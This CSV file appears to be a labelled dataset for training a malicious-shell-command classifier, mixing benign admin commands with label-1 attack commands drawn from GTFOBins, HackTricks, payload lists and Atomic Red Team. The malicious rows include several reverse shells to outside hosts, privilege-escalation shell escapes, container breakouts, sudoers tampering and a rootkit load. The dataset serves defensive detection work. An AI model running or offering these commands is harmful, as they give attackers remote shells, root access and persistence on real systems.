id,command,label,source,split
d1_000040,sudo pacman -Rs docker.io,0,bash_instruct,train
d1_000041,time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi,1,hacktricks,train
d1_000042,podman ps [-l|--latest],0,tldr,train
d1_000043,wg < path/to/private_key pubkey > path/to/public_key,0,tldr,train
d1_000044,apptainer push [-U|--allow-unsigned] path/to/image.sif library://user/collection/container:tag,0,tldr,train
d1_000045,"nb [q|search] ""keyword""",0,tldr,train
d1_000046,"readlink /proc/self/ns/{pid,mnt,net,ipc,cgroup,user} 2>/dev/null",1,hacktricks,train
d1_000047,awk '{print $9}' api.log | sort | uniq -c | sort -nr | head -n 20,0,bash_instruct,train
d1_000048,chmod 644 event.txt,0,bash_instruct,train
d1_000049,docker compose stop [-t|--timeout] seconds,0,tldr,train
d1_000050,dig @some.other.ip.address domain. a,0,nl2bash,train
d1_000051,chmod 744 event.js,0,bash_instruct,train
d1_000052,docker run --name zipkin -p 9411:9411 -d openzipkin/zipkin,0,linlm,train
d1_000053,cat test.json | tail -n 15,0,bash_instruct,train
d1_000054,apt show redis-tools,0,bash_instruct,train
d1_000055,"tail -n 10 /var/log/syslog | grep --color=always -i ""failed""",0,bash6k,train
d1_000057,cat order.md | grep -v '^$',0,bash_instruct,train
d1_000058,"R --no-save -e 'system(""/bin/sh"")'",1,gtfobins,train
d1_000059,"which dumpcap && getcap ""$(which dumpcap)""",1,hacktricks,train
d1_000061,git extras update,0,tldr,train
d1_000064,sudo pacman -S xfce4-terminal,0,linlm,train
d1_000065,find . -iname .ssh > triznadm/sshlist 2>/dev/null,1,slp,train
d1_000068,convert photo.png -quality 80 photo.jpg,0,bash6k,train
d1_000069,cat product.md | grep -v '^$',0,bash_instruct,train
d1_000070,ifdata,0,tldr,train
d1_000071,chcon [-t|--type] type filename,0,tldr,train
d1_000074,lpstat -E,0,tldr,train
d1_000075,mamba list,0,tldr,train
d1_000076,cargo add dependency@version,0,tldr,train
d1_000077,mv -n credentials.tmp credentials.tmp.old,0,bash_instruct,train
d1_000078,mv transaction.sql config/,0,bash_instruct,train
d1_000080,save,1,gtfobins,train
d1_000081,"cat /etc/passwd | grep ""sh$""",1,hacktricks,train
d1_000083,chsh [-s|--shell] user nologin,0,tldr,train
d1_000084,76.132.177.92 == 2130706433,1,hacktricks,train
d1_000086,get path/to/remote_file,0,tldr,train
d1_000087,find / -user olduser -type f -exec chown newuser {} \,0,nl2bash,train
d1_000088,cat metrics.csv | tail -n 15,0,bash_instruct,train
d1_000089,ufw allow port/protocol,0,tldr,train
d1_000090,heroku logs --app app_name,0,tldr,train
d1_000091,node --inspect=7.98.246.159:4444 app.js,1,hacktricks,train
d1_000092,ps aux | grep mysql | grep -v grep,0,nl2bash,train
d1_000093,top -l 1 -s 0 -i 1 -stats vprvt -pid $PID,0,nl2bash,train
d1_000094,cp -p data.xml src/,0,bash_instruct,train
d1_000095,readlink /proc/1234/fd/3,1,hacktricks,train
d1_000096,chmod 744 request.json,0,bash_instruct,train
d1_000097,LESSOPEN='|/tmp/lesspipe.sh %s' less /etc/hosts,1,hacktricks,train
d1_000098,egrep -o '$1$w{8}S{22}' *.txt > md5-unix-old.txt,1,hacktricks,train
d1_000099,kubectl cp namespace/pod_name:/path/to/file_in_pod path/to/local_file,0,tldr,train
d1_000100,readlink /proc/1/ns/net,1,hacktricks,train
d1_000101,mkfifo /path/to/temp-socket,1,gtfobins,train
d1_000102,srun --mem 8G path/to/program,0,tldr,train
d1_000103,pro fix CVE-number,0,tldr,train
d1_000104,ENCODED=$(echo 'Hello from Atomic Red Team test T1140!' | xxd -ps -c 256),1,atomic_red_team,train
d1_000105,find downloads -type f -size 1G,0,bash_instruct,train
d1_000106,find /sys -maxdepth 3 -writable 2>/dev/null | head,1,hacktricks,train
d1_000107,ls -lt templates,0,bash_instruct,train
d1_000108,"ART=$(echo -n ""id"" | $encodecmd)",1,atomic_red_team,train
d1_000109,cat payment.conf | tail -n 15,0,bash_instruct,train
d1_000110,git guilt [-w|--ignore-whitespace],0,tldr,train
d1_000112,"echo ""Highlighted text: ""`xclip -o 2>/dev/null`",1,hacktricks,train
d1_000114,sudo chown redis backup.conf,0,bash_instruct,train
d1_000115,rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc example.com 4242 >/tmp/f,1,slp,train
d1_000116,alacritty,0,linlm,train
d1_000117,"ldapsearch -Y gssapi -b ""cn=sudorules,cn=sudo,dc=domain_name,dc=local""",1,hacktricks,train
d1_000118,mv request.xml modules/,0,bash_instruct,train
d1_000119,sort notes.tsv,0,bash_instruct,train
d1_000120,sudo less /var/log/new,1,hacktricks,train
d1_000121,dmsetup ls --exec '/bin/sh -p -s',1,gtfobins,train
d1_000122,[ -f build.tar.gz ] && cat build.tar.gz || echo 'not found',0,bash_instruct,train
d1_000123,find . -name file_name,0,nl2bash,train
d1_000124,grep -rl 'stale' bin,0,bash_instruct,train
d1_000125,ppmtorgb3 path/to/file.ppm,0,tldr,train
d1_000126,grep -oE '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+' audit.conf | sort -u,0,bash_instruct,train
d1_000127,telnet 85.67.42.74 8080 | /bin/sh | telnet 85.67.42.74 8081,1,payloads,train
d1_000129,sudo chgrp wheel order.gz,0,bash_instruct,train
d1_000130,paperkey --pubring path/to/public_key.gpg --secrets path/to/secret_data.txt --output secret_key.gpg,0,tldr,train
d1_000132,printf '%s\n' 'exit 0' | sudo tee -a /etc/rc.common,1,atomic_red_team,train
d1_000133,file inventory.json,0,bash_instruct,train
d1_000138,tail -n 20 archive.bak,0,bash_instruct,train
d1_000139,"emacs -Q -nw --eval '(term ""/bin/sh"")'",1,gtfobins,train
d1_000140,"PATH=""/bin"" /bin/ls",1,hacktricks,train
d1_000141,file users.json,0,bash_instruct,train
d1_000143,xxd -l 64 access.tmp,0,bash_instruct,train
d1_000144,chmod go-w account.csv,0,bash_instruct,train
d1_000145,"git log --pretty=format:""%an"" | sort | uniq -c | sort -rn",0,linlm,train
d1_000146,for p in 80 443 8000 8080 8081 9000 5000; do,1,hacktricks,train
d1_000149,find /home/family/Music -name '*.m4a' -print0,0,nl2bash,train
d1_000150,sed 's/PUT/false/g' payload.csv,0,bash_instruct,train
d1_000151,pacman -Q | grep linux,0,linlm,train
d1_000152,find /path/to/input-file -exec cat {} \;,1,gtfobins,train
d1_000154,TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply,1,hacktricks,train
d1_000155,git reset-file path/to/file commit_hash,0,tldr,train
d1_000156,docker logs container_name,0,linlm,train
d1_000158,cp -u archive.zip bin/,0,bash_instruct,train
d1_000159,CONFIG=/path/to/configuration lxc-checkconfig,0,tldr,train
d1_000160,"cut -d, -f9 gateway.log | sort | uniq -c | sort -nr | head -n 15",0,bash_instruct,train
d1_000161,find /home -type f -name *.log -size +100M -exec rm -f {} \;,0,nl2bash,train
d1_000162,kldstat | grep vmm,1,atomic_red_team,train
d1_000163,ech''o test,1,hacktricks,train
d1_000164,find ~/test -type d -exec basename {} \;,0,nl2bash,train
d1_000165,find . -name '*.gz' | xargs gzip -l | tail -n +2 | head -n -1 | sort -k 2 | tail -n 1 | awk '{print $NF}',0,nl2bash,train
d1_000166,cat dump.log | wc -l,0,bash_instruct,train
d1_000167,"git -C ~/projects/myrepo add . && git -C ~/projects/myrepo commit -m ""Update config files""",0,bash6k,train
d1_000171,[ -f schema.zip ] && cat schema.zip || echo 'not found',0,bash_instruct,train
d1_000172,cp source.txt dest.txt,0,linlm,train
d1_000173,cp -u output.txt public/,0,bash_instruct,train
d1_000174,curl -sk https://hd9b3da4c.example.net/runningpods/,1,hacktricks,train
d1_000175,"sed 's/\t/,/g' request.log > request.log.csv",0,bash_instruct,train
d1_000176,sockstat -cnw,0,tldr,train
d1_000177,opencode models provider,0,tldr,train
d1_000178,mvn site [-pl|--projects] module_name,0,tldr,train
d1_000179,find . -size -26c -size +23c -exec ls -l '{}' \;,0,nl2bash,train
d1_000180,ssh svc-app@web01.internal uptime,0,bash_instruct,train
d1_000181,resolvectl query domain1 domain2 ...,0,tldr,train
d1_000183,tee,0,nl2bash,train
d1_000184,find . -type f | egrep '\.(shtml|css)$',0,nl2bash,train
d1_000185,ifconfig eth0 | grep HWaddr |cut -dH -f2|cut -d\ -f2,0,nl2bash,train
d1_000186,echo 'Zone Test 2:00 Jordan CE%sT' >>/path/to/temp-file,1,gtfobins,train
d1_000187,git notes append object,0,tldr,train
d1_000188,sqlite-utils [-h|--help],0,tldr,train
d1_000190,cat product.tsv | sort | uniq -c | sort -nr,0,bash_instruct,train
d1_000191,gunzip -c output.gz,0,bash6k,train
d1_000192,`sudo chown -R mongodb:mongodb /data/*`,0,nl2bash,train
d1_000194,unflatten path/to/input.gv | dot -T png path/to/output.png,0,tldr,train
d1_000195,chmod +x build.js,0,bash_instruct,train
d1_000197,zip -r config.zip config,0,bash_instruct,train
d1_000198,"0x0000000000003000=cap_net_admin,cap_net_raw",1,hacktricks,train
d1_000199,tmpmail [-g|--generate],0,tldr,train
d1_000201,ls -li /path/a /path/b,1,hacktricks,train
d1_000202,tb [-t|--task] task_description @board_name,0,tldr,train
d1_000204,mknod /dev/sdb b 8 16,1,hacktricks,train
d1_000205,"find . -name ""*.rb"" -type f -print0 | xargs -0 wc -l",0,nl2bash,train
d1_000206,hashcat [-m|--hash-type] hash_type_id [-a|--attack-mode] 0 [-r|--rules-file] path/to/file.rule hash_value path/to/wordlist.txt,0,tldr,train
d1_000207,"xxh ""host"" ++install-xxh-packages package",0,tldr,train
d1_000208,bmaptool create [-o|--output] blockmap.bmap source.img,0,tldr,train
d1_000209,"find . -name ""*.txt"" -print0 | xargs -0 egrep 'string'",0,nl2bash,train
d1_000210,find /var/cache -type f -empty,0,bash_instruct,train
d1_000211,fail2ban-client -c /path/to/temp-dir/ -v restart,1,gtfobins,train
d1_000215,"sudo lsmod | grep -i ""virtio_pci\|virtio_net""",1,atomic_red_team,train
d1_000216,jj prev [-e|--edit],0,tldr,train
d1_000218,wget https://h0caaf24a.example.net/foo,0,tldr,train
d1_000220,chmod 744 order.gz,0,bash_instruct,train
d1_000221,xcrun tool arguments,0,tldr,train
d1_000224,kopia repository create filesystem --path path/to/local_repository,0,tldr,train
d1_000225,pg_dumpall > path/to/file.sql,0,tldr,train
d1_000226,"echo ""$host_path/evil-helper"" > /sys/kernel/uevent_helper",1,hacktricks,train
d1_000227,find | xargs,0,nl2bash,train
d1_000229,"find / -perm /u+w,g+w,o+w",0,nl2bash,train
d1_000230,find test -type d -regex '.*/course[0-9.]*',0,nl2bash,train
d1_000231,"sed 's/\t/,/g' payload.conf > payload.conf.csv",0,bash_instruct,train
d1_000232,chmod +x settings.yaml,0,bash_instruct,train
d1_000233,cat profile.csv | wc -l,0,bash_instruct,train
d1_000234,cat config.conf | sort | uniq -c | sort -nr,0,bash_instruct,train
d1_000236,shuf [-n|--head-count] 3 [-i|--input-range] 1-10 [-r|--repeat],0,tldr,train
d1_000237,source <(./generate_commands),0,nl2bash,train
d1_000239,wc -c export.log,0,bash_instruct,train
d1_000240,sort test.json | uniq -c | sort -nr,0,bash_instruct,train
d1_000241,find /data/uploads -type f -name '*.log' -print0 | xargs -0 gzip,0,bash_instruct,train
d1_000243,dumpcap [-D|--list-interfaces],0,tldr,train
d1_000244,pamexec command path/to/image.pam [-c|-check],0,tldr,train
d1_000245,srm [-s|--simple] path/to/file,0,tldr,train
d1_000246,dpkg-buildpackage [-r|--root-command=]fakeroot,0,tldr,train
d1_000247,cat response.md | tr ' ' '\n' | sort | uniq -c | sort -nr | head -n 5,0,bash_instruct,train
d1_000248,"sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /usr/local/etc/sudoers",1,atomic_red_team,train
d1_000249,sfdk qmltypes --restore-emulator,0,tldr,train
d1_000250,react-native run-android --variant=release,0,tldr,train
d1_000251,"for variable in item1 item2 ...; do echo ""Loop is executed""; done",0,tldr,train
d1_000253,uvcdynctrl [-d|--device] device_name,0,tldr,train
d1_000254,sudo pacman -S audacious,0,linlm,train
d1_000255,mv response.tmp response.tmp.old,0,bash_instruct,train
d1_000256,aws pricing describe-services --region us-east-1,0,tldr,train
d1_000257,cp -p index.sql media/,0,bash_instruct,train
d1_000258,stat /path/to/suspicious,1,hacktricks,train
d1_000260,s bookmark_name,0,tldr,train
d1_000261,mkdir -p $HOME/go/src/github.com/lxc/,1,hacktricks,train
d1_000262,[ -f build.md ] && cat build.md || echo 'not found',0,bash_instruct,train
d1_000263,sudo chgrp users data.png,0,bash_instruct,train
d1_000264,"grep -oP ""^CHROOT_VERSION='\K[^']+"" /usr/share/devtools/lib/archroot.sh >.arch-chroot",1,gtfobins,train
d1_000265,rm -i *.tmp,0,bash_instruct,train
d1_000266,ls [-la|-l --all],0,tldr,train
d1_000267,stty size,0,bash6k,train
d1_000268,monitor_port() {,0,bash6k,train
d1_000269,tail -n 20 access.yaml,0,bash_instruct,train
d1_000270,zerotier-idtool validate path/to/identity.public,0,tldr,train
d1_000271,"curl -X POST -H ""Content-Type: application/json"" -d '{\""key\"":\""value\""}' https://h0caaf24a.example.net",0,linlm,train
d1_000272,cp -u access.tmp project/,0,bash_instruct,train
d1_000273,mv *.jpg releases/,0,bash_instruct,train
d1_000274,du -sh /var/lib/mysql,0,bash_instruct,train
d1_000275,systemsoundserverd,0,tldr,train
d1_000277,ping -c 250 84.166.54.191 > /dev/null,1,atomic_red_team,train
d1_000278,sudo bcachefs device add --label group.name path/to/mountpoint path/to/device,0,tldr,train
d1_000279,cat export.ini | tail -n 15,0,bash_instruct,train
d1_000280,"tr -cs ""[:alnum:]"" ""\n"" < words.txt | sort | uniq -c | sort -nr | head -n 10",0,bash6k,train
d1_000281,octez-client get balance for alias_or_address,0,tldr,train
d1_000282,"find . \( \( -path ""\.?.*"" -type d \) -o -path ""*normal*"" \) -prune -o \( -type f \) -print",0,nl2bash,train
d1_000284,sudo tee /etc/nginx/sites-available/mysite << 'EOF' server { listen 80; server_name example.com; root /var/www/html; } EOF,0,linlm,train
d1_000285,nc -6 -lvnp 4444 &,1,hacktricks,train
d1_000286,"find . -name ""*.rb"" -type f -exec chmod 600 {} \;",0,nl2bash,train
d1_000287,echo $filename | egrep -o '[[:digit:]]{5}' | head -n1,0,nl2bash,train
d1_000288,/path/to/ld.so /bin/sh -p,1,gtfobins,train
d1_000289,du -ah /mnt/data | sort -rh | head -n 20,0,bash_instruct,train
d1_000290,sudo parted [-l|--list],0,tldr,train
d1_000291,busybox sh &,1,atomic_red_team,train
d1_000292,virsh pool-list --autostart|no-autostart,0,tldr,train
d1_000293,rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 15.22.101.194 4242 >/tmp/f,1,payloads,train
d1_000294,emulate zsh -R,0,tldr,train
d1_000295,du -h public/* | sort -rh | head -n 10,0,bash_instruct,train
d1_000296,sort -u invoice.csv,0,bash_instruct,train
d1_000297,sed -i '1d' request.md,0,bash_instruct,train
d1_000298,tldr [-p|--platform] windows msedge,0,tldr,train
d1_000299,find /var/log -type f -size +1G,0,bash6k,train
d1_000300,sudo chown backup response.bak,0,bash_instruct,train
d1_000301,ls -Z /path/of/interest,1,hacktricks,train
d1_000303,pg /path/to/input-file,1,gtfobins,train
d1_000304,docker [start|container start] container,0,tldr,train
d1_000305,xxd -r -ps <(echo 2f6574632f706173737764),1,hacktricks,train
d1_000307,capsh --print | grep cap_sys_admin,1,hacktricks,train
d1_000310,pacdiff [-l|--locate],0,tldr,train
d1_000312,airpaste < path/to/file,0,tldr,train
d1_000313,git help [-a|--all],0,tldr,train
d1_000314,config set dbfilename output-file,1,gtfobins,train
d1_000316,sudo du -hDaxd1 /var | sort -h | tail -n10,0,nl2bash,train
d1_000317,"set s [socket attacker.com 12345];while 1 { puts -nonewline $s ""> "";flush $s;gets $s c;set e ""exec $c"";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;",1,gtfobins,train
d1_000318,bc --mathlib,0,tldr,train
d1_000319,aws s3 mb s3://bucket_name,0,tldr,train
d1_000320,sudo lxc-start container_name [-F|--foreground],0,tldr,train
d1_000321,chmod 744 data.js,0,bash_instruct,train
d1_000322,"mysql -u root -p -e ""CREATE DATABASE cache; USE cache; CREATE TABLE cache_data (cache_key VARCHAR(255) PRIMARY KEY, cache_value LONGBLOB, cache_expiration INT);""",0,linlm,train
d1_000323,mv *.bak cache/,0,bash_instruct,train
d1_000325,"socat tcp-listen:12345,reuseaddr,fork 'exec:/bin/sh -p,pty,stderr,setsid,sigint,sane'",1,gtfobins,train
d1_000326,tar -czf - reports | ssh carol@staging.internal 'cat > /backup/reports.tar.gz',0,bash_instruct,train
d1_000327,sudo ausearch [-m|--message] avc [-c|--comm] service_name | audit2why,0,tldr,train
d1_000329,mysql --default-auth ../../../../../path/to/lib,1,gtfobins,train
d1_000330,sudo chown nginx changelog.jpg,0,bash_instruct,train
d1_000331,gzip -l archive.tar.gz,0,nl2bash,train
d1_000333,"find . -type f -newermt ""2014-01-01"" ! -newermt ""2014-06-01""",0,nl2bash,train
d1_000334,tr '\0' ' ' </proc/$pid/cmdline; echo,1,hacktricks,train
d1_000335,git push origin master,0,bash6k,train
d1_000336,du -sh bin,0,bash_instruct,train
d1_000337,ls -d config/*/,0,bash_instruct,train
d1_000338,zcat /proc/config.gz 2>/dev/null | head,1,hacktricks,train
d1_000339,iptables -A INPUT -i lo -j ACCEPT,1,hacktricks,train
d1_000340,wc -l summary.zip,0,bash_instruct,train
d1_000342,polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie,1,hacktricks,train
d1_000344,cat auth.conf | sort | uniq -c | sort -nr,0,bash_instruct,train
d1_000345,jira issue edit,0,tldr,train
d1_000346,./linpeas.sh -i 126.48.103.17,1,hacktricks,train
d1_000347,"cut -d, -f9 inventory.csv | sort | uniq -c | sort -nr | head -n 15",0,bash_instruct,train
d1_000348,find / -name docker-compose.yml -exec ls -l {} 2>/dev/null \;,1,slp,train
d1_000349,siege [-t|--time] 30s [-f|--file] path/to/url_list.txt,0,tldr,train
d1_000350,msgfilter -P -i /path/to/input-file /bin/cat,1,gtfobins,train
d1_000351,openssl < /dev/null s_client -connect host:443 -showcerts,0,tldr,train
d1_000352,rpmspec --query --srpm path/to/rpm.spec,0,tldr,train
d1_000355,[ -f users.bak ] && cat users.bak || echo 'not found',0,bash_instruct,train
d1_000356,fzf --bind 'enter:execute(/bin/sh)',1,gtfobins,train
d1_000357,sudo auto-cpufreq --monitor|live|update|remove|stats|force=governor,0,tldr,train
d1_000358,sudo pacman -S terminus,0,linlm,train
d1_000360,env -i ./makeall.sh,0,nl2bash,train
d1_000361,tail -n 20 report.gz,0,bash_instruct,train
d1_000364,fw.write('DATA');,1,gtfobins,train
d1_000365,journalctl -u haproxy -n 50,0,bash_instruct,train
d1_000366,[ -f output.html ] && cat output.html || echo 'not found',0,bash_instruct,train
d1_000368,sudo chgrp wheel response.gz,0,bash_instruct,train
d1_000369,[ -f response.csv ] && cat response.csv || echo 'not found',0,bash_instruct,train
d1_000370,rsync -rvv *.txt user@remote.machine:/tmp/newdir/,0,nl2bash,train
d1_000371,find $DBA/$ORACLE_SID/bdump/*.trc -mtime -1 -print >> /tmp/trace_list.lst,0,nl2bash,train
d1_000372,unrar e compressed.rar,0,tldr,train
d1_000374,pkcon install package,0,tldr,train
d1_000375,elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then,1,hacktricks,train
d1_000376,"cut -d, -f4 messages | sort | uniq -c | sort -nr | head -n 20",0,bash_instruct,train
d1_000377,"find . -type f -newermt ""$date_time""",0,nl2bash,train
d1_000378,xxd -l 64 settings.yaml,0,bash_instruct,train
d1_000379,cat /proc/self/uid_map,1,hacktricks,train
d1_000380,sed -i '1d' summary.md,0,bash_instruct,train
d1_000381,yum info zsh,0,nl2bash,train
d1_000382,sudo chgrp deploy config.txt,0,bash_instruct,train
d1_000386,csh -b,1,gtfobins,train
d1_000387,sudo pacman -S barrier,0,linlm,train
d1_000388,var BufferedReader = Java.type('java.io.BufferedReader');,1,gtfobins,train
d1_000389,find sort_test -type f | env -i LC_COLLATE=en_US.UTF-8 sort,0,nl2bash,train
d1_000391,printf '%s\n' '#!/bin/bash' 'date -u > /var/tmp/userdata-ran.txt' > my_script.txt,1,atomic_red_team,train
d1_000392,"touch /host/tmp/selinux_test 2>/dev/null && echo ""host write works""",1,hacktricks,train
d1_000393,desc table_name;,0,tldr,train
d1_000394,find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq,1,hacktricks,train
d1_000395,ls /proc | grep '^[0-9]' | head -n 20,1,hacktricks,train
d1_000396,[ -f access.sh ] && cat access.sh || echo 'not found',0,bash_instruct,train
d1_000397,command --interactive,0,linlm,train
d1_000399,ssh -L 8080:76.132.177.92:8080 user@target,1,hacktricks,train
d1_000400,docker -H unix:///var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null,1,hacktricks,train
d1_000401,"export 4nfp_1=""188.221.140.163"";export 4nfp_2=14187;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(""4nfp_1""),int(os.getenv(""4nfp_2""))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(""/usr/bin/sh"")'python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""188.221.140.163"",14187));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(""/usr/bin/sh"")'",1,quasarnix,train
d1_000402,fusermount -z path/to/mount_point,0,tldr,train
d1_000403,"find ./ -name ""* *"" -type f -d 1 | perl -ple '$file = $_; $file =~ s/\s+/_/g; rename($_, $file);'",0,nl2bash,train
d1_000404,wget https://h3cf88e0a.example.net/lxc/lxc-ci/master/images/alpine.yaml,1,hacktricks,train
d1_000405,touch configure.ac,1,gtfobins,train
d1_000407,tar caf path/to/target.tar.xz path/to/file1 path/to/file2 ...,0,tldr,train
d1_000408,find . -type f | xargs cat | wordfrequency | grep yourword,0,nl2bash,train
d1_000409,git log --oneline --graph,0,linlm,train
d1_000410,oxdf@hacky$ chmod 4755 /mnt/nfsshare/a,1,hacktricks,train
d1_000411,cat account.tsv | grep -v '^$',0,bash_instruct,train
d1_000412,cat /etc/mtab,0,linlm,train
d1_000413,[ -f users.log ] && cat users.log || echo 'not found',0,bash_instruct,train
d1_000414,find / -empty,0,nl2bash,train
d1_000416,gimp -idf --batch-interpreter=python-fu-eval -b '...',1,gtfobins,train
d1_000418,chmod 644 changelog.conf,0,bash_instruct,train
d1_000420,openssl genrsa -out newuser.key 2048,1,hacktricks,train
d1_000421,"cat /sys/class/thermal/thermal_zone0/temp | awk '{print $1/1000 ""°C""}'",0,bash6k,train
d1_000423,sudo rm -rf /usr/local/bin/npm /usr/local/share/man/man1/node* /usr/local/lib/dtrace/node.d ~/.npm ~/.node-gyp /opt/local/bin/node opt/local/include/node /opt/local/lib/node_modules,0,nl2bash,train
d1_000424,find . -type f -newermt 2007-06-07 ! -newermt 2007-06-08,0,nl2bash,train
d1_000425,"sed 's/\t/,/g' export.conf > export.conf.csv",0,bash_instruct,train
d1_000426,modinfo ./candidate.ko 2>/dev/null,1,hacktricks,train
d1_000427,systemctl start art-systemd-service.service,1,atomic_red_team,train
d1_000428,find . -ok tar rvf backup {} \;,0,nl2bash,train
d1_000429,mv data.yaml data.yaml.old,0,bash_instruct,train
d1_000430,[ -f backup.csv ] && cat backup.csv || echo 'not found',0,bash_instruct,train
d1_000431,ansible-lint path/to/playbook_file path/to/role_directory,0,tldr,train
d1_000432,"xsetwacom set ""device_name"" Mode ""Relative|Absolute""",0,tldr,train
d1_000433,sed 's/^[[:space:]]*//' error.txt > clean.txt,0,bash_instruct,train
d1_000434,steamcmd +login username +logout +quit,0,tldr,train
d1_000439,find / -perm -u=s -type f 2>/dev/null,1,slp,train
d1_000440,find . -name *.jpg,0,nl2bash,train
d1_000441,lolcat [-S|--seed] number path/to/file,0,tldr,train
d1_000442,ls -lh cache,0,bash_instruct,train
d1_000444,"echo ""$t/c"" > ""$d/release_agent""",1,hacktricks,train
d1_000445,chmod 744 summary.log,0,bash_instruct,train
d1_000446,ssh operator@cache.service.io,0,bash_instruct,train
d1_000447,sudo chgrp mysql product.zip,0,bash_instruct,train
d1_000448,finger -l | awk '/^Login/' | sed 's/of group.*//g',0,nl2bash,train
d1_000449,ip [n|neighbor],0,tldr,train
d1_000450,airshare --file-path code,0,tldr,train
d1_000451,sed -i 's/info/warning/g' backup.ini,0,bash_instruct,train
d1_000452,"sed 's/\t/,/g' schema.ini > schema.ini.csv",0,bash_instruct,train
d1_000453,scp -vp me@server:/location/files\*,0,nl2bash,train
d1_000454,tre [-d|--directories],0,tldr,train
d1_000455,"echo ""[Unit]"" > /etc/systemd/system/atomic-persist.service",1,atomic_red_team,train
d1_000456,yum install mysql mysql-server,0,nl2bash,train
d1_000457,nc 76.132.177.92 4444,1,hacktricks,train
d1_000458,find /home/family/Music -name *.m4a -print0,0,nl2bash,train
d1_000459,stat payment.py,0,bash_instruct,train
d1_000460,diff --suppress-common-lines --speed-large-files -y File1 File2 | wc -l,0,nl2bash,train
d1_000462,echo $(dirname $(readlink -m $BASH_SOURCE)),0,nl2bash,train
d1_000463,sudo modprobe diamorphine,1,atomic_red_team,train
